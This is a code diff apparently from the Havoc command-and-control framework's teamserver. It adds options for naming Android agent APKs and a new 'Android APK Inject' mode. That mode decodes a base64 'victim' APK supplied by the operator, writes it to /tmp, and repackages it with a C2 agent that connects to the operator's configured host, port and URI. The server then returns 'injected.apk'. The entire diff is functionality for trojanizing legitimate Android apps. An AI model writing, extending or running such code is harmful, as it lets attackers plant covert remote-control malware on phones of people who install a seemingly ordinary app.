@@ -1,6 +1,7 @@
 package server
 
 import (
+	"encoding/base64"
 	"encoding/json"
 	"errors"
 	"fmt"
@@ -17,6 +18,7 @@ import (
 	"Havoc/pkg/logr"
 	llmPkg "Havoc/pkg/llm"
 	"Havoc/pkg/packager"
+	"Havoc/pkg/utils"
 )
 
 func (t *Teamserver) DispatchEvent(pk packager.Package) {
@@ -971,6 +973,21 @@ func (t *Teamserver) DispatchEvent(pk packager.Package) {
 					}
 					if c2Uri == "" { c2Uri = "/" }
 
+					// Extract optional PackageName / AppLabel from Config JSON
+					// (shared by both Android APK and Android APK Inject)
+					var cfgPkgName, cfgAppLabel string
+					if Config != "" {
+						var cfgMap map[string]interface{}
+						if err := json.Unmarshal([]byte(Config), &cfgMap); err == nil {
+							if v, ok := cfgMap["PackageName"].(string); ok && v != "" {
+								cfgPkgName = v
+							}
+							if v, ok := cfgMap["AppLabel"].(string); ok && v != "" {
+								cfgAppLabel = v
+							}
+						}
+					}
+
 					// Android APK — separate builder
 					if Format == "Android APK" {
 						ab := builder.NewAndroidBuilder(builder.AndroidBuilderConfig{
@@ -981,13 +998,64 @@ func (t *Teamserver) DispatchEvent(pk packager.Package) {
 						ab.Port = c2Port
 						ab.Uri  = c2Uri
 						ab.Ssl  = c2Ssl
-						if c2UA != "" { ab.UserAgent = c2UA }
+						if c2UA != ""      { ab.UserAgent   = c2UA }
+						if cfgPkgName != "" { ab.PackageName = cfgPkgName }
+						if cfgAppLabel != "" { ab.AppLabel   = cfgAppLabel }
 						if ab.Build() {
 							data, err := os.ReadFile(ab.OutputPath)
 							if err == nil && len(data) > 0 {
 								_ = t.SendEvent(ClientID, events.Gate.SendStageless("demon.apk", data))
 							}
 							os.RemoveAll(ab.CompileDir)
+						}
+						return
+					}
+
+					// Android APK Inject — repackage an existing victim APK
+					if Format == "Android APK Inject" {
+						// Config JSON must contain "SourceApk" as base64-encoded APK bytes
+						var cfgMap map[string]interface{}
+						if err := json.Unmarshal([]byte(Config), &cfgMap); err != nil {
+							SendConsoleMsg("Error", "Invalid config JSON: "+err.Error())
+							return
+						}
+						srcB64, ok := cfgMap["SourceApk"].(string)
+						if !ok || srcB64 == "" {
+							SendConsoleMsg("Error", "No victim APK provided (SourceApk missing in config)")
+							return
+						}
+						apkBytes, err := base64.StdEncoding.DecodeString(srcB64)
+						if err != nil {
+							SendConsoleMsg("Error", "SourceApk base64 decode failed: "+err.Error())
+							return
+						}
+
+						// Write victim APK to a temp file
+						victimPath := "/tmp/havoc_victim_" + utils.GenerateID(8) + ".apk"
+						if err := os.WriteFile(victimPath, apkBytes, 0644); err != nil {
+							SendConsoleMsg("Error", "Failed to write victim APK: "+err.Error())
+							return
+						}
+						defer os.Remove(victimPath)
+
+						ai := builder.NewApkInjector(builder.ApkInjectorConfig{
+							DebugDev: t.Flags.Server.DebugDev,
+						})
+						ai.SendConsoleMessage = SendConsoleMsg
+						ai.Host          = c2Host
+						ai.Port          = c2Port
+						ai.Uri           = c2Uri
+						ai.Ssl           = c2Ssl
+						if c2UA != ""       { ai.UserAgent   = c2UA }
+						if cfgPkgName != "" { ai.PackageName = cfgPkgName }
+						ai.VictimApkPath = victimPath
+
+						if ai.Inject() {
+							data, err := os.ReadFile(ai.OutputPath)
+							if err == nil && len(data) > 0 {
+								_ = t.SendEvent(ClientID, events.Gate.SendStageless("injected.apk", data))
+							}
+							os.RemoveAll(ai.CompileDir)
 						}
 						return
 					}
